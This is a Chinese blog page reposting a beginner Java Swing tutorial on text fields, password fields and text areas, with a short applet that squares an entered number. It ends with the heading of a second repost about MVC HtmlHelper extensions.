
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="baidu-site-verification" content="1XvvwQ7Apt" />
  
    <title>dianzi blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="edwin">
    

    
    <meta name="description" content="edwin jin dianzi blog">
<meta property="og:type" content="website">
<meta property="og:title" content="dianzi blog">
<meta property="og:url" content="http://taojinke.github.io/page/5/index.html">
<meta property="og:site_name" content="dianzi blog">
<meta property="og:description" content="edwin jin dianzi blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="dianzi blog">
<meta name="twitter:description" content="edwin jin dianzi blog">

    
    <link rel="alternative" href="/atom.xml" title="dianzi blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css" type="text/css">

  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?345f95aea4ada2935d6f9ea4177b51ab";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>

</head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="dianzi blog" title="dianzi blog"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="dianzi blog">dianzi blog</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
						<a href="/music/index.html" target="_blank">Music</a>
					</li>
					<li>
 					
						<form class="search" action="http://taojinke.github.io/" target="_blank">
							<label>Search</label>
						<input name="s" type="hidden" value= null ><input type="text" name="q" size="30" placeholder="搜索"><br>
						</form>
					
					</li>
				</ul>
			</nav>			
</div>

    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/6623bc8/" title="Java知多少（85）文本框和文本区 -" itemprop="url">Java知多少（85）文本框和文本区 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Java&#x77E5;&#x591A;&#x5C11;&#xFF08;85&#xFF09;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;85&#xFF09;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 12:52:00  <a href="/sites/nI7bueF">&#x535A;&#x5BA2;&#x56ED;_Coda</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/Coda/p/4558275.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/Coda/p/4558275.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11000072">Java</a></p>
<p>&#x5728;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E2D;&#xFF0C;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;&#x662F;&#x7528;&#x4E8E;&#x4FE1;&#x606F;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
<h2 id="&#x6587;&#x672C;&#x6846;">&#x6587;&#x672C;&#x6846;</h2><p>&#x6587;&#x672C;&#x6846;(JTextField)&#x662F;&#x754C;&#x9762;&#x4E2D;&#x7528;&#x4E8E;&#x8F93;&#x5165;&#x548C;&#x8F93;&#x51FA;&#x4E00;&#x884C;&#x6587;&#x672C;&#x7684;&#x6846;&#x3002;JTextField&#x7C7B;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x6587;&#x672C;&#x6846;&#x3002;&#x4E0E;&#x6587;&#x672C;&#x6846;&#x76F8;&#x5173;&#x7684;&#x63A5;&#x53E3;&#x662F;ActionListener&#x3002;</p>
<p>&#x6587;&#x672C;&#x6846;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x7684;&#x57FA;&#x672C;&#x5185;&#x5BB9;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#xFF1A;</p>
<ol>
<li>&#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x540D;&#x3002;</li>
<li>&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x5BF9;&#x8C61;&#x3002;</li>
<li>&#x5C06;&#x6587;&#x672C;&#x6846;&#x5BF9;&#x8C61;&#x52A0;&#x5165;&#x5230;&#x67D0;&#x4E2A;&#x5BB9;&#x5668;&#x3002;</li>
<li>&#x5BF9;&#x9700;&#x8981;&#x63A7;&#x5236;&#x7684;&#x6587;&#x672C;&#x6846;&#x5BF9;&#x8C61;&#x6CE8;&#x518C;&#x76D1;&#x89C6;&#x5668;&#xFF0C;&#x76D1;&#x542C;&#x6587;&#x672C;&#x6846;&#x7684;&#x8F93;&#x5165;&#x7ED3;&#x675F;(&#x5373;&#x8F93;&#x5165;&#x56DE;&#x8F66;&#x952E;)&#x4E8B;&#x4EF6;&#x3002;</li>
<li>&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x6587;&#x672C;&#x6846;&#x4E8B;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5B8C;&#x6210;&#x5BF9;&#x622A;&#x83B7;&#x4E8B;&#x4EF6;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#x548C;&#x5904;&#x7406;&#x3002;</li>
</ol>
<p>JTextField&#x7C7B;&#x7684;&#x4E3B;&#x8981;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>JTextField()&#xFF0C;&#x6587;&#x672C;&#x6846;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x4E3A;1&#x3002;</li>
<li>JTextField(int columns)&#xFF0C;&#x6587;&#x672C;&#x6846;&#x521D;&#x59CB;&#x503C;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6587;&#x672C;&#x6846;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x8BBE;&#x4E3A;columns.</li>
<li>JTextField(String text),&#x6587;&#x672C;&#x6846;&#x521D;&#x59CB;&#x503C;&#x4E3A;text&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;</li>
<li>JTextField(String text,int columns);&#x6587;&#x672C;&#x6846;&#x521D;&#x59CB;&#x503C;&#x4E3A;text&#xFF0C;&#x6587;&#x672C;&#x6846;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x4E3A;columns&#x3002;</li>
</ol>
<p>JTextField&#x7C7B;&#x7684;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>setFont(Font f),&#x8BBE;&#x7F6E;&#x5B57;&#x4F53;</li>
<li>setText(String text)&#xFF0C;&#x5728;&#x6587;&#x672C;&#x6846;&#x4E2D;&#x8BBE;&#x7F6E;&#x6587;&#x672C;</li>
<li>getText()&#xFF0C;&#x83B7;&#x53D6;&#x6587;&#x672C;&#x6846;&#x4E2D;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>setEditable(boolean)&#xFF0C;&#x6307;&#x5B9A;&#x6587;&#x672C;&#x6846;&#x7684;&#x53EF;&#x7F16;&#x8F91;&#x6027;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;true&#xFF0C;&#x53EF;&#x7F16;&#x8F91;&#x3002;</li>
<li>setHorizontalAlignment(int alignment)&#x8BBE;&#x7F6E;&#x6587;&#x672C;&#x5BF9;&#x9F50;&#x65B9;&#x5F0F;&#x3002;&#x5BF9;&#x9F50;&#x65B9;&#x5F0F;&#x6709;&#xFF1A;JTextField.LEFT, JTextField.CENTER, JTextField.RIGHT&#x3002;</li>
<li>requestFocus()&#xFF0C;&#x8BBE;&#x7F6E;&#x7126;&#x70B9;&#x3002;</li>
<li>addActionListener(ActionListener )&#xFF0C;&#x4E3A;&#x6587;&#x672C;&#x6846;&#x8BBE;&#x7F6E;&#x52A8;&#x4F5C;&#x76D1;&#x89C6;&#x5668;&#xFF0C;&#x6307;&#x5B9A;ActionListener&#x5BF9;&#x8C61;&#x63A5;&#x6536;&#x8BE5;&#x6587;&#x672C;&#x6846;&#x4E0A;&#x53D1;&#x751F;&#x7684;&#x8F93;&#x5165;&#x7ED3;&#x675F;&#x52A8;&#x4F5C;&#x4E8B;&#x4EF6;&#x3002;</li>
<li>removeActionListener(ActionListener)&#x79FB;&#x53BB;&#x6587;&#x672C;&#x6846;&#x76D1;&#x89C6;&#x5668;&#x3002;</li>
<li>getColumns(),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x7684;&#x5217;&#x6570;&#x3002;</li>
<li>getMinimumSize(),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x5C3A;&#x5BF8;&#x3002;</li>
<li>getMinimumSize(int), &#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x5C3A;&#x5BF8;&#x3002;</li>
<li>getPreferredSize(),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x5E0C;&#x671B;&#x5177;&#x6709;&#x7684;&#x5C3A;&#x5BF8;&#x3002;</li>
<li>getPreferredSize(int),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x5728;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5E0C;&#x671B;&#x5177;&#x6709;&#x7684;&#x5C3A;&#x5BF8;&#x3002;</li>
</ol>
<p>&#x3010;&#x4F8B; 11-8&#x3011;&#x5C0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x3002;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x7528;&#x4E8E;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x663E;&#x793A;&#x8FD9;&#x4E2A;&#x6574;&#x6570;&#x7684;&#x5E73;&#x65B9;&#x503C;&#x3002;&#x7A0B;&#x5E8F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x57FA;&#x672C;&#x7C7B;&#x578B;&#x7684;&#x65B9;&#x6CD5;Long.parseLong(text1.getText())&#xFF0C;&#x8BFB;&#x53D6;&#x6587;&#x672C;&#x6846;text1&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5E76;&#x5C06;&#x5B83;&#x8F6C;&#x6362;&#x6210;&#x6574;&#x6570;&#x3002;&#x7A0B;&#x5E8F;&#x7528;Sqr&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x4F5C;&#x4E3A;&#x76D1;&#x89C6;&#x5668;&#xFF0C;&#x4F46;&#x4E3A;&#x4E86;&#x8BA9;&#x76D1;&#x89C6;&#x5668;&#x80FD;&#x8BBF;&#x95EE;&#x4E3B;&#x7C7B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x4E3B;&#x7C7B;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x88AB;&#x58F0;&#x660E;&#x4E3A;&#x7C7B;&#x53D8;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002; </p>
<pre><code><span class="xml"> 1 import java.applet.*;import javax.swing.*;import java.awt.event.*;
 2 public class J508 extends Applet</span><span class="expression">{
 3     <span class="variable">static</span> <span class="variable">JTextField</span> <span class="variable">text</span>1,<span class="variable">text</span>2;
 4     <span class="variable">Sqr</span> <span class="variable">s</span>=<span class="variable">new</span> <span class="variable">Sqr</span>();//&amp;<span class="begin-block">#x</span>521<span class="variable">B</span>;&amp;<span class="begin-block">#x</span>5<span class="variable">EFA</span>;&amp;<span class="begin-block">#x</span>76<span class="variable">D</span>1;&amp;<span class="begin-block">#x</span>89<span class="variable">C</span>6;&amp;<span class="begin-block">#x</span>5668;
 5     <span class="variable">public</span> <span class="variable">void</span> <span class="variable">init</span>(){
 6         <span class="variable">text</span>1=<span class="variable">new</span> <span class="variable">JTextField</span>(10);
 7         <span class="variable">text</span>2=<span class="variable">new</span> <span class="variable">JTextField</span>(10);
 8         <span class="variable">add</span>(<span class="variable">text</span>1);
 9         <span class="variable">add</span>(<span class="variable">text</span>2);
10         <span class="variable">text</span>1<span class="variable">.addActionListener</span>(<span class="variable">s</span>);//&amp;<span class="begin-block">#x</span>7<span class="variable">C</span>7<span class="variable">B</span>;<span class="variable">Sqr</span>&amp;<span class="begin-block">#x</span>7684;&amp;<span class="begin-block">#x</span>5<span class="variable">B</span>9<span class="variable">E</span>;&amp;<span class="begin-block">#x</span>4<span class="variable">F</span>8<span class="variable">B</span>;<span class="variable">s</span>&amp;<span class="begin-block">#x</span>4<span class="variable">F</span>5<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>4<span class="variable">E</span>3<span class="variable">A</span>;<span class="variable">text</span>1&amp;<span class="begin-block">#x</span>7684;&amp;<span class="begin-block">#x</span>76<span class="variable">D</span>1;&amp;<span class="begin-block">#x</span>89<span class="variable">C</span>6;&amp;<span class="begin-block">#x</span>5668;
11     }</span><span class="xml">
12 }
13 class Sqr implements ActionListener</span><span class="expression">{
14     <span class="variable">public</span> <span class="variable">void</span> <span class="variable">actionPerformed</span>(<span class="variable">ActionEvent</span> <span class="variable">e</span>){//&amp;<span class="begin-block">#x</span>5<span class="variable">B</span>9<span class="variable">E</span>;&amp;<span class="begin-block">#x</span>73<span class="variable">B</span>0;&amp;<span class="begin-block">#x</span>63<span class="variable">A</span>5;&amp;<span class="begin-block">#x</span>53<span class="variable">E</span>3;<span class="variable">ActionListener</span>
15         <span class="variable"><span class="keyword">if</span></span>(<span class="variable">e.getSource</span>()==<span class="variable">J</span>508<span class="variable">.text</span>1){
16             <span class="variable">long</span> <span class="variable">n</span>=<span class="variable">Long.parseLong</span>(<span class="variable">J</span>508<span class="variable">.text</span>1<span class="variable">.getText</span>());
17             //&amp;<span class="begin-block">#x</span>5<span class="variable">C</span>06;<span class="variable">text</span>1&amp;<span class="begin-block">#x</span>7684;&amp;<span class="begin-block">#x</span>6587;&amp;<span class="begin-block">#x</span>672<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>8<span class="variable">F</span>6<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>6362;&amp;<span class="begin-block">#x</span>6210;<span class="variable">long</span>&amp;<span class="begin-block">#x</span>578<span class="variable">B</span>;&amp;<span class="begin-block">#x</span>6570;&amp;<span class="begin-block">#x</span>636<span class="variable">E</span>;
18             <span class="variable">J</span>508<span class="variable">.text</span>2<span class="variable">.setText</span>(<span class="variable">String.valueOf</span>(<span class="variable">n</span>*<span class="variable">n</span>));
19             //&amp;<span class="begin-block">#x</span>5<span class="variable">C</span>06;<span class="variable">n</span>*<span class="variable">n</span>&amp;<span class="begin-block">#x</span>8<span class="variable">F</span>6<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>5316;&amp;<span class="begin-block">#x</span>4<span class="variable">E</span>3<span class="variable">A</span>;&amp;<span class="begin-block">#x</span>5<span class="variable">B</span>57;&amp;<span class="begin-block">#x</span>7<span class="variable">B</span>26;&amp;<span class="begin-block">#x</span>4<span class="variable">E</span>32;
20         }</span><span class="xml">
21         else</span><span class="expression">{}</span><span class="xml">
22     }
23 }</span>
</code></pre><p>&#x5BC6;&#x7801;&#x6846;(JPasswordField)&#x662F;&#x4E00;&#x4E2A;&#x5355;&#x884C;&#x7684;&#x8F93;&#x5165;&#x7EC4;&#x4EF6;&#xFF0C;&#x4E0E;JTextField&#x57FA;&#x672C;&#x7C7B;&#x4F3C;&#x3002;&#x5BC6;&#x7801;&#x6846;&#x591A;&#x4E00;&#x4E2A;&#x5C4F;&#x853D;&#x529F;&#x80FD;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x8F93;&#x5165;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x4EE5;&#x4E00;&#x4E2A;&#x522B;&#x7684;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;(&#x4E00;&#x822C;&#x662F;*&#x5B57;&#x7B26;)&#x8F93;&#x51FA;&#x3002;&#x9664;&#x4E86;&#x524D;&#x9762;&#x4ECB;&#x7ECD;&#x7684;&#x6587;&#x672C;&#x6846;&#x7684;&#x65B9;&#x6CD5;&#x5916;&#xFF0C;&#x53E6;&#x6709;&#x4E00;&#x4E9B;&#x5BC6;&#x7801;&#x6846;&#x5E38;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<ol>
<li>getEchoChar(),&#x8FD4;&#x56DE;&#x5BC6;&#x7801;&#x7684;&#x56DE;&#x663E;&#x5B57;&#x7B26;&#x3002;</li>
<li>setEchoChar(char)&#xFF0C;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;&#x6846;&#x7684;&#x56DE;&#x663E;&#x5B57;&#x7B26;&#x3002;</li>
</ol>
<h2 id="&#x6587;&#x672C;&#x533A;">&#x6587;&#x672C;&#x533A;</h2><p>&#x6587;&#x672C;&#x533A;(JTextArea)&#x662F;&#x7A97;&#x4F53;&#x4E2D;&#x4E00;&#x4E2A;&#x653E;&#x7F6E;&#x6587;&#x672C;&#x7684;&#x533A;&#x57DF;&#x3002;&#x6587;&#x672C;&#x533A;&#x4E0E;&#x6587;&#x672C;&#x6846;&#x7684;&#x4E3B;&#x8981;&#x533A;&#x522B;&#x662F;&#x6587;&#x672C;&#x533A;&#x53EF;&#x5B58;&#x653E;&#x591A;&#x884C;&#x6587;&#x672C;&#x3002;javax.swing&#x5305;&#x4E2D;&#x7684;JTextArea&#x7C7B;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x6587;&#x672C;&#x533A;&#x3002;JTextArea&#x7EC4;&#x4EF6;&#x6CA1;&#x6709;&#x4E8B;&#x4EF6;&#x3002;</p>
<p>&#x6587;&#x672C;&#x533A;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x7684;&#x57FA;&#x672C;&#x5185;&#x5BB9;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#xFF1A;</p>
<ol>
<li>&#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x540D;&#x3002;</li>
<li>&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>&#x5C06;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x52A0;&#x5165;&#x5230;&#x67D0;&#x4E2A;&#x5BB9;&#x5668;&#x3002;</li>
</ol>
<p>JTextArea&#x7C7B;&#x7684;&#x4E3B;&#x8981;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>JTextArea()&#xFF0C;&#x4EE5;&#x9ED8;&#x8BA4;&#x7684;&#x5217;&#x6570;&#x548C;&#x884C;&#x6570;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>JTextArea(String s),&#x4EE5;s&#x4E3A;&#x521D;&#x59CB;&#x503C;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>JTextArea(Strings ,int x,int y)&#xFF0C;&#x4EE5;s&#x4E3A;&#x521D;&#x59CB;&#x503C;&#xFF0C;&#x884C;&#x6570;&#x4E3A;x,&#x5217;&#x6570;&#x4E3A;y,&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>JTextArea(int x,int y)&#x4EE5;&#x884C;&#x6570;&#x4E3A;x,&#x4EE5;&#x5217;&#x6570;&#x4E3A;y&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
</ol>
<p>JTextArea&#x7C7B;&#x7684;&#x5176;&#x4ED6;&#x5E38;&#x7528;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>setText(String s),&#x8BBE;&#x7F6E;&#x663E;&#x793A;&#x6587;&#x672C;&#xFF0C;&#x540C;&#x65F6;&#x6E05;&#x9664;&#x539F;&#x6709;&#x6587;&#x672C;&#x3002;</li>
<li>getText()&#xFF0C;&#x83B7;&#x53D6;&#x6587;&#x672C;&#x533A;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>insert(String s,int x),&#x5728;&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>replace(String s,int x,int y),&#x7528;&#x7ED9;&#x5B9A;&#x7684;&#x4E00;&#x66FF;&#x6362;&#x4ECE;x&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x5230;y&#x4F4D;&#x7F6E;&#x7ED3;&#x675F;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>append(String s)&#xFF0C;&#x5728;&#x6587;&#x672C;&#x533A;&#x8FFD;&#x52A0;&#x6587;&#x672C;&#x3002;</li>
<li>getCarePosition(),&#x83B7;&#x53D6;&#x6587;&#x672C;&#x533A;&#x4E2D;&#x6D3B;&#x52A8;&#x5149;&#x6807;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</li>
<li>setCarePosition(int n)&#xFF0C;&#x8BBE;&#x7F6E;&#x6D3B;&#x52A8;&#x5149;&#x6807;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</li>
<li>setLineWrap(boolean b)&#xFF0C;&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;&#x6362;&#x884C;&#xFF0C;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#xFF0C;&#x4E0D;&#x81EA;&#x52A8;&#x6362;&#x884C;&#x3002;</li>
</ol>
<p>&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x80FD;&#x81EA;&#x52A8;&#x6362;&#x884C;&#x3002;</p>
<p>JTextArea textA = new JTextArea(&#x201C;&#x6211;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x201D;,10,15);</p>
<p>textA.setLineWrap(true);//&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;&#x6362;&#x884C;</p>
<p>&#x5F53;&#x6587;&#x672C;&#x533A;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x8F83;&#x591A;&#xFF0C;&#x4E0D;&#x80FD;&#x5728;&#x6587;&#x672C;&#x533A;&#x5168;&#x90E8;&#x663E;&#x793A;&#x65F6;&#xFF0C;&#x53EF;&#x7ED9;&#x6587;&#x672C;&#x533A;&#x914D;&#x4E0A;&#x6EDA;&#x52A8;&#x6761;&#x3002;&#x7ED9;&#x6587;&#x672C;&#x533A;&#x8BBE;&#x7F6E;&#x6EDA;&#x52A8;&#x6761;&#x53EF;&#x7528;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code><span class="number">1</span>     <span class="class">JTextArea</span> ta = new <span class="class">JTextArea</span>();
<span class="number">2</span>     <span class="class">JScrollPane</span> jsp = new <span class="class">JScrollPane</span>(ta);//&amp;<span class="symbol">#x7ED9</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x672C</span>;&amp;<span class="symbol">#x533A</span>;&amp;<span class="symbol">#x6DFB</span>;&amp;<span class="symbol">#x52A0</span>;&amp;<span class="symbol">#x6EDA</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6761</span>;
</code></pre><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/jMVF7bI">.spring jdbctemplate&#x6E90;&#x7801;&#x8DDF;&#x8E2A;</a></li>
<li>2.<a href="/articles/b2eMne7">&#x518D;&#x56DE;&#x9996;&#xFF0C;Java&#x6E29;&#x6545;&#x77E5;&#x65B0;&#xFF08;&#x516B;&#xFF09;&#xFF1A;Java&#x57FA;&#x7840;&#x4E4B;&#x5B57;&#x7B26;&#x4E32;</a></li>
<li>3.<a href="/articles/za2Efm3">Java PermGen &#x53BB;&#x54EA;&#x91CC;&#x4E86;?</a></li>
<li>4.<a href="/articles/677JjyM">&#x4F7F;&#x7528;Ant&#x81EA;&#x52A8;&#x5316;&#x6211;&#x4EEC;&#x7684;java&#x9879;&#x76EE;&#x751F;&#x6210;</a></li>
<li>5.<a href="/articles/y6jEj23">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;84&#xFF09;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E4B;&#x5E03;&#x5C40;&#x8BBE;&#x8BA1;</a></li>
<li><p>6.<a href="/articles/vaMvIzm">&#x5173;&#x4E8E;Java&#x914D;&#x7F6E;&#x6587;&#x4EF6;properties&#x7684;&#x5B66;&#x4E60;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/meYF3ir">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;meYF3ir&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Java/">Java</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/65ecce0/" title="Expression Tree 扩展MVC HtmlHelper 和 UrlHelper -" itemprop="url">Expression Tree 扩展MVC HtmlHelper 和 UrlHelper -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Expression_Tree_&#x6269;&#x5C55;MVC_HtmlHelper_&#x548C;_UrlHelper">Expression Tree &#x6269;&#x5C55;MVC HtmlHelper &#x548C; UrlHelper</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 13:14:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/richieyang/p/4558269.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/richieyang/p/4558269.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11080033">MVC&#x6A21;&#x5F0F;</a><a href="/topics/11050000">.Net</a></p>
